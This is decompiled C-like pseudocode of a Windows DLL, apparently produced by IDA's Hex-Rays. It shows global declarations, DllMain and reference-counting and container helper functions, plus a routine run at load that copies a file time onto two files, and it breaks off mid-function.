_DWORD dword_100BF2A8[2]; // weak
_DWORD dword_100BF2B0[2]; // weak
_DWORD dword_100BF2B8[2]; // weak
_DWORD dword_100BF2C0[2]; // weak
_DWORD dword_100BF2C8[2]; // weak
_DWORD dword_100BF2D0[2]; // weak
_DWORD dword_100BF2D8[2]; // weak
_DWORD dword_100BF2E0[2]; // weak
_DWORD dword_100BF2E8[2]; // weak
_DWORD dword_100BF2F0[2]; // weak
_DWORD dword_100BF2F8[2]; // weak
_DWORD dword_100BF300[2]; // weak
_DWORD dword_100BF308[2]; // weak
_DWORD dword_100BF310[2]; // weak
_DWORD dword_100BF318[2]; // weak
_DWORD dword_100BF320[2]; // weak
_DWORD dword_100BF328[2]; // weak
_DWORD dword_100BF330[2]; // weak
_DWORD dword_100BF338[2]; // weak
_DWORD dword_100BF340[2]; // weak
_DWORD dword_100BF348[2]; // weak
_DWORD dword_100BF350[2]; // weak
_DWORD dword_100BF358[2]; // weak
_DWORD dword_100BF360[2]; // weak
_DWORD dword_100BF368[2]; // weak
_DWORD dword_100BF370[2]; // weak
_DWORD dword_100BF378[2]; // weak
_DWORD dword_100BF380[2]; // weak
_DWORD dword_100BF388[2]; // weak
_DWORD dword_100BF390[2]; // weak
_DWORD dword_100BF398[2]; // weak
_DWORD dword_100BF3A0[2]; // weak
_DWORD dword_100BF3A8[2]; // weak
_DWORD dword_100BF3B0[2]; // weak
_DWORD dword_100BF3B8[2]; // weak
_DWORD dword_100BF3C0[2]; // weak
_DWORD dword_100BF3C8[2]; // weak
_DWORD dword_100BF3D0[2]; // weak
_DWORD dword_100BF3D8[2]; // weak
_DWORD dword_100BF3E0[2]; // weak
_DWORD dword_100BF3E8[2]; // weak
_DWORD dword_100BF3F0[2]; // weak
_DWORD dword_100BF3F8[2]; // weak
_DWORD dword_100BF400[2]; // weak
_DWORD dword_100BF408[2]; // weak
_DWORD dword_100BF410[2]; // weak
_DWORD dword_100BF418[2]; // weak
_DWORD dword_100BF420[2]; // weak
_DWORD dword_100BF428[2]; // weak
_DWORD dword_100BF430[2]; // weak
_DWORD dword_100BF438[2]; // weak
_DWORD dword_100BF440[2]; // weak
_DWORD dword_100BF448[2]; // weak
_DWORD dword_100BF450[2]; // weak
_DWORD dword_100BF458[2]; // weak
_DWORD dword_100BF460[2]; // weak
_DWORD dword_100BF468[2]; // weak
_DWORD dword_100BF470[2]; // weak
_DWORD dword_100BF478[2]; // weak
_DWORD dword_100BF480[2]; // weak
_DWORD dword_100BF488[2]; // weak
_DWORD dword_100BF490[2]; // weak
_DWORD dword_100BF498[2]; // weak
_DWORD dword_100BF4A0[2]; // weak
_DWORD dword_100BF4A8[2]; // weak
_DWORD dword_100BF4B0[2]; // weak
_DWORD dword_100BF4B8[2]; // weak
_DWORD dword_100BF4C0[2]; // weak
_DWORD dword_100BF4C8[2]; // weak
_DWORD dword_100BF4D0[2]; // weak
_DWORD dword_100BF4D8[2]; // weak
_DWORD dword_100BF4E0[2]; // weak
_DWORD dword_100BF4E8[2]; // weak
_DWORD dword_100BF4F0[2]; // weak
_DWORD dword_100BF4F8[2]; // weak
_DWORD dword_100BF500[2]; // weak
_DWORD dword_100BF508[2]; // weak
_DWORD dword_100BF510[2]; // weak
_DWORD dword_100BF518[2]; // weak
_DWORD dword_100BF520[2]; // weak
_DWORD dword_100BF528[2]; // weak
_DWORD dword_100BF530[2]; // weak
_DWORD dword_100BF538[2]; // weak
_DWORD dword_100BF540[2]; // weak
_DWORD dword_100BF548[2]; // weak
_DWORD dword_100BF550[2]; // weak
_DWORD dword_100BF558[2]; // weak
_DWORD dword_100BF560[2]; // weak
_DWORD dword_100BF568[2]; // weak
_DWORD dword_100BF570[2]; // weak
_DWORD dword_100BF578[2]; // weak
_DWORD dword_100BF580[2]; // weak
_DWORD dword_100BF588[2]; // weak
_DWORD dword_100BF590[2]; // weak
_DWORD dword_100BF598[2]; // weak
_DWORD dword_100BF5A0[2]; // weak
_DWORD dword_100BF5A8[2]; // weak
_DWORD dword_100BF5B0[2]; // weak
_DWORD dword_100BF5B8[2]; // weak
_DWORD dword_100BF5C0[2]; // weak
_DWORD dword_100BF5C8[2]; // weak
_DWORD dword_100BF5D0[2]; // weak
_DWORD dword_100BF5D8[2]; // weak
_DWORD dword_100BF5E0[2]; // weak
_DWORD dword_100BF5E8[2]; // weak
_DWORD dword_100BF5F0[2]; // weak
_DWORD dword_100BF5F8[2]; // weak
_DWORD dword_100BF600[2]; // weak
_DWORD dword_100BF608[2]; // weak
_DWORD dword_100BF610[2]; // weak
_DWORD dword_100BF618[2]; // weak
_DWORD dword_100BF620[2]; // weak
_DWORD dword_100BF628[2]; // weak
_DWORD dword_100BF630[2]; // weak
_DWORD dword_100BF638[2]; // weak
_DWORD dword_100BF640[2]; // weak
_DWORD dword_100BF648[2]; // weak
_DWORD dword_100BF650[2]; // weak
_DWORD dword_100BF658[2]; // weak
_DWORD dword_100BF660[2]; // weak
_DWORD dword_100BF668[2]; // weak
_DWORD dword_100BF670[2]; // weak
_DWORD dword_100BF678[2]; // weak
_DWORD dword_100BF680[2]; // weak
_DWORD dword_100BF688[2]; // weak
_DWORD dword_100BF690[2]; // weak
_DWORD dword_100BF698[2]; // weak
_DWORD dword_100BF6A0[2]; // weak
_DWORD dword_100BF6A8[2]; // weak
_DWORD dword_100BF6B0[2]; // weak
_DWORD dword_100BF6B8[2]; // weak
int dword_100BF6C0; // weak
int dword_100BF6C4; // weak
int dword_100BF6C8; // weak
int dword_100BF6CC; // weak
int dword_100BF6D0; // weak
int dword_100BF6D8; // weak
_DWORD dword_100BF6E0[2]; // weak
_DWORD dword_100BF6E8[2]; // weak
_DWORD dword_100BF6F0; // weak
DWORD dwTlsIndex; // idb
_DWORD dword_100BF6F8[2]; // weak
_DWORD dword_100BF700[2]; // weak
_DWORD dword_100BF708[2]; // weak
_DWORD dword_100BF710[2]; // weak
_DWORD dword_100BF718[2]; // weak
_DWORD dword_100BF720[2]; // weak
_DWORD dword_100BF728[2]; // weak
_DWORD dword_100BF730[2]; // weak
_DWORD dword_100BF738[2]; // weak
_DWORD dword_100BF740[2]; // weak
LONG Addend; // idb
int dword_100BF74C; // weak
int dword_100BF750; // weak
_DWORD dword_100BF754[2]; // weak
_DWORD dword_100BF75C[2]; // weak
_DWORD dword_100BF764[2]; // weak
_DWORD dword_100BF76C[2]; // weak
_DWORD dword_100BF774; // weak
DWORD dword_100BF778; // idb
_DWORD dword_100BF77C[2]; // weak
_DWORD dword_100BF784[2]; // weak
_DWORD dword_100BF78C[2]; // weak
_DWORD dword_100BF794[2]; // weak
_DWORD dword_100BF79C[2]; // weak
_DWORD dword_100BF7A4[2]; // weak
_DWORD dword_100BF7AC[2]; // weak
_DWORD dword_100BF7B4[2]; // weak
_DWORD dword_100BF7BC[2]; // weak
_DWORD dword_100BF7C4[2]; // weak
_DWORD dword_100BF7CC[2]; // weak
_DWORD dword_100BF7D4[2]; // weak
_DWORD dword_100BF7DC[2]; // weak
_DWORD dword_100BF7E4[2]; // weak
_DWORD dword_100BF7EC[2]; // weak
_DWORD dword_100BF7F4[2]; // weak
_DWORD dword_100BF7FC[2]; // weak
int dword_100BF804; // weak
_UNKNOWN unk_100BF808; // weak
_UNKNOWN unk_100BF80C; // weak
int dword_100BF810[]; // weak
int dword_100BF814[]; // weak
int dword_100BF818; // weak
int dword_100BF938; // weak
int dword_100BF93C; // weak
_DWORD dword_100BF940[2]; // weak
_DWORD dword_100BF948[2]; // weak
_DWORD dword_100BF950[2]; // weak
_DWORD dword_100BF958[2]; // weak
_DWORD dword_100BF960[2]; // weak
_DWORD dword_100BF968[2]; // weak
_DWORD dword_100BF970[2]; // weak
_DWORD dword_100BF978[2]; // weak
_DWORD dword_100BF980[2]; // weak
_DWORD dword_100BF988[2]; // weak
_DWORD dword_100BF990[2]; // weak
_DWORD dword_100BF998[2]; // weak
_DWORD dword_100BF9A0[2]; // weak
_DWORD dword_100BF9A8[2]; // weak
int dword_100BF9B0; // weak
int dword_100BF9B4; // weak
int dword_100BF9B8; // weak
int dword_100BF9BC; // weak
int dword_100BF9C0; // weak
int dword_100BF9C4; // weak
int dword_100BF9C8; // weak
_DWORD dword_100BF9CC[2]; // weak
_DWORD dword_100BF9D4[2]; // weak
_DWORD dword_100BF9DC[2]; // weak
int dword_100BF9E4[9]; // weak
int dword_100BFA08[9]; // weak
_DWORD dword_100BFA2C[2]; // weak
char byte_100BFA34; // weak
_DWORD dword_100BFA38[2]; // weak
char byte_100BFA40; // weak
_DWORD dword_100BFA44[2]; // weak
int dword_100BFA4C[9]; // weak
int dword_100BFA70[9]; // weak
_DWORD dword_100BFA94[3]; // weak
_DWORD dword_100BFAA0[2]; // weak
_DWORD dword_100BFAA8[2]; // weak
_DWORD dword_100BFAB0[2]; // weak
int dword_100C0AC4; // weak
int dword_100C0C04; // weak


//----- (10001000) --------------------------------------------------------
_DWORD *__usercall sub_10001000@<eax>(_DWORD *result@<eax>)
{
  *result = &off_10092F00;
  return result;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);

//----- (1000102B) --------------------------------------------------------
_DWORD *__stdcall sub_1000102B(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10092F00;
  *a1 = &off_10092F08;
  return result;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);
// 10092F08: using guessed type int (__thiscall *off_10092F08)(void *Block, char);

//----- (1000105A) --------------------------------------------------------
void *__thiscall sub_1000105A(void *Block, char a2)
{
  sub_10001077(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10001077: using guessed type _DWORD __stdcall sub_10001077(_DWORD);

//----- (10001077) --------------------------------------------------------
_DWORD *__stdcall sub_10001077(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = &off_10092F00;
  return result;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);

//----- (1000109C) --------------------------------------------------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  int v4; // [esp+0h] [ebp-3Ch] BYREF
  char v5[12]; // [esp+Ch] [ebp-30h] BYREF
  char v6[12]; // [esp+18h] [ebp-24h] BYREF
  char v7[8]; // [esp+24h] [ebp-18h] BYREF
  int *v8; // [esp+2Ch] [ebp-10h]
  int v9; // [esp+38h] [ebp-4h]

  v8 = &v4;
  v9 = 0;
  sub_10010526(v7);
  LOBYTE(v9) = 1;
  sub_10010428((int)v6);
  LOBYTE(v9) = 2;
  sub_10012981(v5);
  LOBYTE(v9) = 3;
  sub_1000EFCA();
  if ( fdwReason == 1 )
  {
    dword_100B8F1C = (int)hinstDLL;
    sub_10001201();
  }
  LOBYTE(v9) = 2;
  sub_100129C2((int (__cdecl **)(unsigned int))v5);
  LOBYTE(v9) = 1;
  sub_10010466(v6);
  LOBYTE(v9) = 0;
  sub_1001055C(v7);
  return 1;
}
// 100B8F1C: using guessed type int dword_100B8F1C;
// 1000109C: using guessed type char var_18[8];
// 1000109C: using guessed type char var_24[12];
// 1000109C: using guessed type char var_30[12];

//----- (10001135) --------------------------------------------------------
int sub_10001135()
{
  wchar_t *v0; // eax
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v3; // esi
  volatile LONG *v5; // [esp-8h] [ebp-60h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-5Ch]
  int v7; // [esp+0h] [ebp-58h] BYREF
  _DWORD v8[10]; // [esp+Ch] [ebp-4Ch] BYREF
  char v9[8]; // [esp+34h] [ebp-24h] BYREF
  int v10[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  int v11; // [esp+54h] [ebp-4h]

  v10[3] = (int)&v7;
  v11 = 0;
  v0 = (wchar_t *)sub_1000E943((int)&unk_100B9120);
  sub_10012A00(v10, v0);
  LOBYTE(v11) = 1;
  sub_10012BA7((int)v10);
  v6 = v1;
  v5 = v1;
  v10[2] = (int)&v5;
  sub_10014512(&v5);
  LOBYTE(v11) = 1;
  v2 = sub_10011AFB(-1, 0x80000000, v8, (int)v10, 128, -1, (int)v5, v6);
  LOBYTE(v11) = 3;
  v3 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int))(*v2 + 80))(v2, v9, 1);
  LOBYTE(v11) = 1;
  sub_10011C44((int)v8);
  LOBYTE(v11) = 0;
  sub_10012AAC(v10);
  return v3;
}
// 1000116D: variable 'v1' is possibly undefined
// 10001135: using guessed type _DWORD var_4C[10];
// 10001135: using guessed type char var_24[8];

//----- (10001201) --------------------------------------------------------
LONG sub_10001201()
{
  DWORD v0; // edx
  int v2; // [esp+0h] [ebp-34h] BYREF
  int v3[2]; // [esp+Ch] [ebp-28h] BYREF
  int v4[2]; // [esp+14h] [ebp-20h] BYREF
  FILETIME v5; // [esp+1Ch] [ebp-18h] BYREF
  int *v6; // [esp+24h] [ebp-10h]
  int v7; // [esp+30h] [ebp-4h]

  v6 = &v2;
  v7 = 0;
  sub_10012A7C(v3, (int)&unk_100BF588);
  LOBYTE(v7) = 1;
  sub_10012BA7((int)v3);
  sub_10012A7C(v4, (int)&unk_100BF608);
  LOBYTE(v7) = 2;
  sub_10012BA7((int)v4);
  v5.dwLowDateTime = sub_10001135();
  v5.dwHighDateTime = v0;
  sub_100012A7((int)v3, &v5);
  sub_100012A7((int)v4, &v5);
  LOBYTE(v7) = 1;
  sub_10012AAC(v4);
  LOBYTE(v7) = 0;
  return sub_10012AAC(v3);
}
// 10001254: variable 'v0' is possibly undefined

//----- (100012A7) --------------------------------------------------------
LONG __cdecl sub_100012A7(int a1, FILETIME *a2)
{
  volatile LONG *v2; // ecx
  volatile LONG *v4; // [esp-8h] [ebp-78h] BYREF
  volatile LONG *v5; // [esp-4h] [ebp-74h]
  int v6; // [esp+0h] [ebp-70h] BYREF
  HANDLE v7[22]; // [esp+Ch] [ebp-64h] BYREF
  int v8; // [esp+6Ch] [ebp-4h]

  v7[21] = &v6;
  v8 = 0;
  v5 = v2;
  v4 = v2;
  v7[20] = &v4;
  sub_1001445F(&v4);
  LOBYTE(v8) = 0;
  sub_10010633((int)v7, a1, a2, (int)v4, v5);
  LOBYTE(v8) = 2;
  sub_100107AA(v7);
  sub_10012006(v7, a2, 1);
  sub_10010B9D(v7, a2, 1);
  sub_10010B8D(v7);
  LOBYTE(v8) = 0;
  return sub_10010768(v7);
}
// 100012BF: variable 'v2' is possibly undefined

//----- (10001339) --------------------------------------------------------
bool __usercall sub_10001339@<al>(unsigned int *a1@<edi>, int a2)
{
  unsigned int v2; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  _DWORD v9[2]; // [esp+14h] [ebp-3Ch] BYREF
  _DWORD v10[4]; // [esp+1Ch] [ebp-34h] BYREF
  int v11[6]; // [esp+2Ch] [ebp-24h] BYREF
  int v12; // [esp+4Ch] [ebp-4h]

  sub_1000EE6C(v10);
  v2 = 0;
  v12 = 0;
  sub_10010CE9(v11, (int)v10);
  LOBYTE(v12) = 1;
  if ( *a1 )
  {
    do
    {
      v3 = operator new(0x10u);
      LOBYTE(v12) = 2;
      if ( v3 )
        v4 = sub_1001029F(v3, a2, (int)v10);
      else
        v4 = 0;
      LOBYTE(v12) = 1;
      v5 = sub_1000168A(v9, (int)v4);
      LOBYTE(v12) = 3;
      sub_10001594(v11, (int)v5);
      LOBYTE(v12) = 1;
      sub_100016CE(v9);
      a2 += 8;
      ++v2;
    }
    while ( v2 < *a1 );
  }
  v6 = sub_10010D5F(v11) != -1;
  LOBYTE(v12) = 0;
  sub_10010D3B(v11);
  v12 = -1;
  sub_1000EE98(v10);
  return v6;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10001339: using guessed type _DWORD var_34[4];
// 10001339: using guessed type int var_24[6];
// 10001339: using guessed type _DWORD var_3C[2];

//----- (10001429) --------------------------------------------------------
unsigned __int8 __cdecl sub_10001429(_DWORD *a1, int a2, int a3, _DWORD *a4, int a5, unsigned int a6, _DWORD *a7)
{
  unsigned __int8 result; // al
  int v8; // [esp+0h] [ebp-B4h] BYREF
  char v9[124]; // [esp+Ch] [ebp-A8h] BYREF
  int v10[3]; // [esp+88h] [ebp-2Ch] BYREF
  int v11[3]; // [esp+94h] [ebp-20h] BYREF
  _DWORD v12[2]; // [esp+A0h] [ebp-14h] BYREF
  int v13; // [esp+B0h] [ebp-4h]

  v12[1] = &v8;
  v13 = 0;
  result = sub_10001339(dword_10092ED8, (int)&unk_100BF280);
  if ( result != 1 )
  {
    result = sub_10001339(&a6, a5);
    if ( result != 1 )
    {
      sub_10001520(v12);
      LOBYTE(v13) = 1;
      sub_1000F0BC();
      sub_100140E1(a1, (int)v11, 1, 1u, 0);
      LOBYTE(v13) = 2;
      sub_10012ECB((int)v9, (int)&unk_100BF5A0, a2, (int)v11, a3, a4, a7, 0);
      LOBYTE(v13) = 3;
      sub_10013290((int)v9, v10);
      LOBYTE(v13) = 3;
      sub_1000EA34(v10);
      LOBYTE(v13) = 2;
      sub_1001314D((int)v9);
      LOBYTE(v13) = 1;
      sub_100141CF(v11);
      LOBYTE(v13) = 0;
      return (unsigned __int8)sub_10001553(v12);
    }
  }
  return result;
}
// 10092ED8: using guessed type unsigned int dword_10092ED8[10];
// 10001429: using guessed type int var_20[3];
// 10001429: using guessed type int var_2C[3];

//----- (10001520) --------------------------------------------------------
_DWORD *__stdcall sub_10001520(_DWORD *a1)
{
  sub_1000102B(a1);
  *a1 = &off_10092F10;
  return a1;
}
// 10092F10: using guessed type int (__thiscall *off_10092F10)(void *Block, char);

//----- (10001553) --------------------------------------------------------
_DWORD *__stdcall sub_10001553(_DWORD *a1)
{
  return sub_10001077(a1);
}

//----- (10001577) --------------------------------------------------------
_DWORD *__thiscall sub_10001577(_DWORD *Block, char a2)
{
  sub_10001553(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001594) --------------------------------------------------------
void __thiscall sub_10001594(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10001707(v2);
}

//----- (100015D8) --------------------------------------------------------
void __thiscall sub_100015D8(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100017C8((int)this);
}

//----- (10001611) --------------------------------------------------------
_DWORD *__usercall sub_10001611@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10001651) --------------------------------------------------------
void __thiscall sub_10001651(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000186D((int)this);
}

//----- (1000168A) --------------------------------------------------------
_DWORD *__userpurge sub_1000168A@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100016CE) --------------------------------------------------------
void __thiscall sub_100016CE(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10001895((int)this);
}

//----- (10001707) --------------------------------------------------------
void __thiscall sub_10001707(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100018BD((int)this);
}

//----- (10001743) --------------------------------------------------------
char *__usercall sub_10001743@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_10001834);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10001761) --------------------------------------------------------
char *__thiscall sub_10001761(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 8u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1000CE59);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1000CE59((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100017AA) --------------------------------------------------------
char *__usercall sub_100017AA@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_10001651);
  j__free(v1);
  return v1;
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100017C8) --------------------------------------------------------
void __usercall sub_100017C8(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100017F0) --------------------------------------------------------
_DWORD *__userpurge sub_100017F0@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10001834) --------------------------------------------------------
void __thiscall sub_10001834(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100018F6((int)this);
}

//----- (1000186D) --------------------------------------------------------
void __usercall sub_1000186D(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10001895) --------------------------------------------------------
void __usercall sub_10001895(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100018BD) --------------------------------------------------------
void __usercall sub_100018BD(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100018F6) --------------------------------------------------------
void __usercall sub_100018F6(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000191E) --------------------------------------------------------
int __cdecl sub_1000191E(_DWORD *a1, _DWORD *a2, int a3, char *a4)
{
  char *v4; // edi
  int v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  char *i; // ebx
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  int v15[10]; // [esp+Ch] [ebp-74h] BYREF
  _DWORD v16[5]; // [esp+34h] [ebp-4Ch] BYREF
  _DWORD v17[4]; // [esp+48h] [ebp-38h] BYREF
  int v18[3]; // [esp+58h] [ebp-28h] BYREF
  void *v19[4]; // [esp+64h] [ebp-1Ch] BYREF
  int v20; // [esp+7Ch] [ebp-4h]

  sub_1000EE6C(v17);
  v20 = 0;
  sub_10010CE9(v16, (int)v17);
  LOBYTE(v20) = 1;
  v4 = (char *)&unk_100BF280;
  v5 = 95;
  do
  {
    v6 = operator new(0x10u);
    v19[2] = v6;
    LOBYTE(v20) = 2;
    if ( v6 )
      v7 = sub_1001029F(v6, (int)v4, (int)v17);
    else
      v7 = 0;
    LOBYTE(v20) = 1;
    v8 = sub_1000168A(v19, (int)v7);
    LOBYTE(v20) = 3;
    sub_10001594(v16, (int)v8);
    LOBYTE(v20) = 1;
    sub_100016CE(v19);
    v4 += 8;
    --v5;
  }
  while ( v5 );
  for ( i = a4; i; --i )
  {
    v11 = operator new(0x10u);
    LOBYTE(v20) = 4;
    if ( v11 )
      v12 = sub_1001029F(v11, a3, (int)v17);
    else
      v12 = 0;
    LOBYTE(v20) = 1;
    v13 = sub_1000168A(v19, (int)v12);
    LOBYTE(v20) = 5;
    sub_10001594(v16, (int)v13);
    LOBYTE(v20) = 1;
    sub_100016CE(v19);
    a3 += 8;
  }
  sub_100140E1(a2, (int)v18, 1, 1u, 0);
  LOBYTE(v20) = 6;
  sub_10014671(a1, v15, (int)v18, (int)v16);
  LOBYTE(v20) = 7;
  sub_10014738((int)v15);
  LOBYTE(v20) = 6;
  sub_100146DD(v15);
  LOBYTE(v20) = 1;
  sub_100141CF(v18);
  LOBYTE(v20) = 0;
  sub_10010D3B(v16);
  v20 = -1;
  sub_1000EE98(v17);
  return 0;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1000191E: using guessed type _DWORD var_38[4];
// 1000191E: using guessed type _DWORD var_4C[5];
// 1000191E: using guessed type int var_28[3];
// 1000191E: using guessed type int var_74[10];

//----- (10001AA3) --------------------------------------------------------
_DWORD *__userpurge sub_10001AA3@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  sub_10001AD6(a1, a2);
  return a2;
}

//----- (10001AD6) --------------------------------------------------------
_DWORD *__userpurge sub_10001AD6@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  *a2 = *a1;
  a2[1] = a1[1];
  a2[2] = a1[2];
  sub_10002C48(a1 + 3, a2 + 3);
  sub_10002C48(a1 + 7, a2 + 7);
  return a2;
}

//----- (10001B27) --------------------------------------------------------
void *__stdcall sub_10001B27(int a1)
{
  sub_10002CF0((_DWORD *)(a1 + 28));
  return sub_10002CF0((_DWORD *)(a1 + 12));
}

//----- (10001B5C) --------------------------------------------------------
LONG __stdcall sub_10001B5C(int *a1)
{
  return sub_10014DFB(a1);
}

//----- (10001B80) --------------------------------------------------------
int __stdcall sub_10001B80(int a1, char a2, int a3)
{
  sub_100148B1((_DWORD *)a1);
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 136) = 0;
  *(_BYTE *)(a1 + 4) = a2;
  *(_DWORD *)a1 = &off_10092F24;
  *(_DWORD *)(a1 + 132) = a3;
  sub_1000CC20((_DWORD *)(a1 + 140), word_100B8E3C);
  memset((void *)(a1 + 12), 0, 0x78u);
  return a1;
}
// 10092F24: using guessed type int (__thiscall *off_10092F24)(void *Block, char);
// 100B8E3C: using guessed type wchar_t word_100B8E3C[2];

//----- (10001BED) --------------------------------------------------------
int *__thiscall sub_10001BED(int *Block, char a2)
{
  sub_10001C09(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10001C09) --------------------------------------------------------
void __thiscall sub_10001C09(int *this)
{
  *this = (int)&off_10092F24;
  sub_1000CE59(this + 35);
  sub_100148FB(this);
}
// 10092F24: using guessed type int (__thiscall *off_10092F24)(void *Block, char);

//----- (10001C47) --------------------------------------------------------
int sub_10001C47()
{
  return 45;
}

//----- (10001C4B) --------------------------------------------------------
void *__thiscall sub_10001C4B(_DWORD *this, int *a2)
{
  int v2; // esi
  int v3; // ecx
  HWND v4; // eax
  bool v5; // zf
  _DWORD *v6; // eax
  int *v7; // eax
  int *v8; // eax
  int *v9; // eax
  int *v10; // eax
  int v11; // edi
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  _DWORD *v15; // eax
  int v16; // eax
  int v17; // eax
  int v19; // [esp-10h] [ebp-E0h] BYREF
  int v20; // [esp-Ch] [ebp-DCh] BYREF
  int v21; // [esp-8h] [ebp-D8h]
  int v22; // [esp-4h] [ebp-D4h]
  int v23; // [esp+0h] [ebp-D0h] BYREF
  int v24; // [esp+4h] [ebp-CCh]
  int v25[2]; // [esp+18h] [ebp-B8h] BYREF
  _DWORD *v26; // [esp+20h] [ebp-B0h]
  int v27; // [esp+24h] [ebp-ACh] BYREF
  int v28; // [esp+28h] [ebp-A8h] BYREF
  int v29[2]; // [esp+2Ch] [ebp-A4h] BYREF
  int *v30; // [esp+34h] [ebp-9Ch]
  HWND v31; // [esp+38h] [ebp-98h]
  _DWORD v32[5]; // [esp+3Ch] [ebp-94h] BYREF
  int v33[5]; // [esp+50h] [ebp-80h] BYREF
  int v34[3]; // [esp+64h] [ebp-6Ch] BYREF
  _DWORD v35[3]; // [esp+70h] [ebp-60h] BYREF
  int v36[4]; // [esp+7Ch] [ebp-54h] BYREF
